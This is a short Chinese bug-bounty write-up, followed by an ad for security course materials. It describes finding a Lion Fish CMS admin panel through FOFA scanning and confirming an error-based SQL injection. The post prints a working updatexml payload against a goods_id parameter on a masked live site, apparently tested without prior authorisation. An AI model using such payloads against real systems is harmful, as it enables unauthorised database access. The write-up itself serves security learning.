# 原创
：  实战SRC | 某站点后台管理系统SQL注入

# 实战SRC | 某站点后台管理系统SQL注入

本文由掌控安全学院 - 会唱会跳会敲键盘 投稿

```
对于edu来说，是新人挖洞较好的平台，本次记录一次走运的捡漏

```

0x01 前景<br/> 在进行fofa盲打站点的时候，来到了一个后台管理处看到集市二字，应该是edu站点<br/>  

确认目标身份【归属】（使用的quake进行然后去ipc备案查询）<br/>  

<br/>  

<br/> 网站后台很像cms搭建的，在查看网站时发现

```
/seller.php?s=/Public/login

```

典型的狮子鱼cms的特征！！！<br/> 直接去百度一手，发现有个SQL注入还有其他的漏洞，打算一个一个尝试看看<br/>  

<br/> 0x02 尝试挖掘

直接拼接payload，尝试报错注入出数据库名：

```
https://www.xxx.com/index.php?s=api/goods_detail&amp;goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)

```

OK，成功爆破出数据库名，SQL注入一枚到手~

申明：本文所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

## ** 免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/d0981bfbca414b8dbfe82a64c9735735.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5654063fe7764156be0ce6d5b6349d37.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/213f47b964f0417ca78367aad7b039b8.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/3a39449789714d22a074c7bea244b94f.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/82c8b5bfed984be497589b39a3738960.png" width="665"/>

应急响应笔记

学习路线
